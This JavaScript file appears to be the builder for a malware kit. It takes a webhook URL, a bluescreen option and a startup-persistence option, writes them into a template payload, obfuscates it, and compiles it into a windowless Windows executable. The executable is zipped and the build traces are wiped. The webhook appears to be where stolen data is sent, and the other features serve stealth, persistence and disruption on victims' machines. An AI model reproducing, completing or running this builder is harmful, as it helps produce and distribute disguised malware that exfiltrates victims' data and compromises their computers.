const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');
const archiver = require("archiver");
const createNodewExe = require("create-nodew-exe");

async function createNodewExeForFile(filePath) {
  try {
    const newFilePath = filePath.replace(/\.exe$/, '_nodew.exe');
    console.log('Renaming and creating nodew EXE...');
    createNodewExe({
      src: filePath,
      dst: newFilePath,
    });
    console.log('Nodew EXE created successfully at ' + newFilePath);
    return newFilePath;
  } catch (error) {
    console.error('Error creating nodew EXE:', error);
    throw error;
  }
}

async function zipResult(filePath, saveZipPath) {
  const archive = archiver("zip", { zlib: { level: 9 } });
  const output = fs.createWriteStream(saveZipPath);

  return new Promise((resolve, reject) => {
    archive.on("error", (err) => reject(err));
    output.on("close", () => resolve(saveZipPath));

    archive.pipe(output);
    archive.file(filePath, { name: path.basename(filePath) });
    archive.finalize();
  });
}

module.exports = async function buildProject(config) {
  try {
    let { webhook, filename, buildType, startup, bluescreen } = config;
    filename = (filename || 'app') + ".exe";

    const buildDir = path.join(__dirname, 'build');
    const srcDir = path.join(__dirname, 'sourcemap');
    const buildSrcDir = path.join(buildDir, 'src');

    if (!fs.existsSync(buildSrcDir)) {
      fs.mkdirSync(buildSrcDir, { recursive: true });
    }

    console.log('Copying source files...');
    copyFiles(srcDir, buildSrcDir);

    const indexFilePath = path.join(buildSrcDir, 'index.js');
    console.log(`Replacing %WEBHOOK% in ${indexFilePath}...`);
    let content = fs.readFileSync(indexFilePath, 'utf8');
    content = content.replace(/%WEBHOOK%/g, webhook)
    .replace(/"%BLUESCREEN\?%"/g, bluescreen)
    .replace(/"%PERSIST\?%"/g, startup);
    fs.writeFileSync(indexFilePath, content, 'utf8');

    const packageJsonSrc = path.join(srcDir, 'package.json');
    const packageJsonDest = path.join(buildSrcDir, 'package.json');
    if (fs.existsSync(packageJsonSrc)) {
      fs.copyFileSync(packageJsonSrc, packageJsonDest);
    }

    const obfuscatedPath = path.join(buildSrcDir, 'index_obfuscated.js');
    let ObfuscateFile;
    if (buildType === 'bun') {
      ObfuscateFile = require('./cryptPreset/BunObfuscation');
    } else if (buildType === 'pkg') {
      ObfuscateFile = require('./cryptPreset/PkgObfuscation');
    } else {
      throw new Error('Invalid build type specified');
    }

    await ObfuscateFile({ filePath: indexFilePath, outputPath: obfuscatedPath });
    fs.renameSync(obfuscatedPath, indexFilePath);

    let outputFile = '';
    if (buildType === 'bun') {
      console.log('Running bun build...');
      execSync('npm run bunBuild', { stdio: 'inherit', cwd: buildSrcDir });
      outputFile = path.join(buildDir, 'dist', 'app.exe');
    } else if (buildType === 'pkg') {
      console.log('Running pkg build...');
      execSync('pkg . --output ../dist/app.exe --targets node16-win-x64 --compress=GZip ', { stdio: 'inherit', cwd: buildSrcDir });
      outputFile = path.join(buildDir, 'dist', 'app.exe');
    }

    if (outputFile && fs.existsSync(outputFile)) {
      console.log("Build completed, now processing with nodew...");
      const nodewExePath = await createNodewExeForFile(outputFile);
      const finalExePath = path.join(__dirname, filename);
      fs.renameSync(nodewExePath, finalExePath);
      console.log(`Build completed, file renamed to ${finalExePath}`);

      const zipPath = path.join(finalExePath.replace(".exe", ".zip"));
      console.log(`Zipping the exe to ${zipPath}...`);
      await zipResult(finalExePath, zipPath);
      console.log(`ZIP created successfully at ${zipPath}`);
      fs.unlinkSync(finalExePath);
      console.log("Original EXE deleted after zipping.");
    } else {
      console.error(`Output file ${outputFile} does not exist, cannot rename or zip.`);
    }

    const distDir = path.join(buildDir, 'dist');
    if (fs.existsSync(distDir)) {
      fs.readdirSync(distDir).forEach(file => {
        const filePath = path.join(distDir, file);
        fs.lstatSync(filePath).isDirectory()
          ? fs.rmSync(filePath, { recursive: true, force: true })
          : fs.unlinkSync(filePath);
      });
      console.log('Cleaned the contents of the "dist" folder');
    }

    fs.readdirSync(buildSrcDir).forEach(file => {
      const filePath = path.join(buildSrcDir, file);
      fs.lstatSync(filePath).isDirectory()
        ? fs.rmSync(filePath, { recursive: true, force: true })
        : fs.unlinkSync(filePath);
    });
    console.log('Cleaned the contents of the "src" folder');

    console.log('✅ Build process completed successfully!');
    return Promise.resolve();
  } catch (error) {
    console.error('❌ Build failed:', error);
    return Promise.reject(error);
  }
};

function copyFiles(srcDir, destDir) {
  const files = fs.readdirSync(srcDir);
  files.forEach(file => {
    const srcPath = path.join(srcDir, file);
    const destPath = path.join(destDir, file);

    if (fs.lstatSync(srcPath).isFile()) {
      fs.copyFileSync(srcPath, destPath);
    } else if (fs.lstatSync(srcPath).isDirectory()) {
      if (!fs.existsSync(destPath)) {
        fs.mkdirSync(destPath, { recursive: true });
      }
      copyFiles(srcPath, destPath);
    }
  });
}
